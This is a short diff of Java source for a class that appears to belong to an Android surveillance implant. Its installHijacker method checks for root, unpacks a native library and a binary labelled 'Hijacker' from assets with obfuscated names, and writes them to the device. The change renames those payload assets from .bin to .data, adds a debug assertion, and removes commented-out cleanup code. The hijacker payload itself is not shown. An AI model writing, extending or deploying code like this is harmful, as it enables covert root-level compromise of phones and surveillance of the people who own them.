@@ -58,7 +58,8 @@ public class Instrument {
 	}
 
 	private boolean installHijacker() {
-		InputStream stream = Utils.getAssetStream(M.e("i.bin")); // libt.so
+		InputStream stream = Utils.getAssetStream(M.e("ib.data")); // libt.so
+		if (Cfg.DEBUG) { Check.asserts(stream!=null, " (installHijacker) Assert failed"); }
 
 		try {
 			if (PackageInfo.checkRoot() == false) {
@@ -80,7 +81,7 @@ public class Instrument {
 			stream.close();
 
 			// Unpack the Hijacker
-			stream = Utils.getAssetStream(M.e("m.bin")); // Hijacker
+			stream = Utils.getAssetStream(M.e("mb.data")); // Hijacker
 
 			Root.fileWrite(hijacker, stream, Cfg.RNDDB);
 
@@ -94,9 +95,6 @@ public class Instrument {
 
 			return false;
 		}
-
-		// File file = new File(Status.getAppContext().getFilesDir(), lib);
-		// file.delete();
 
 		return true;
 	}
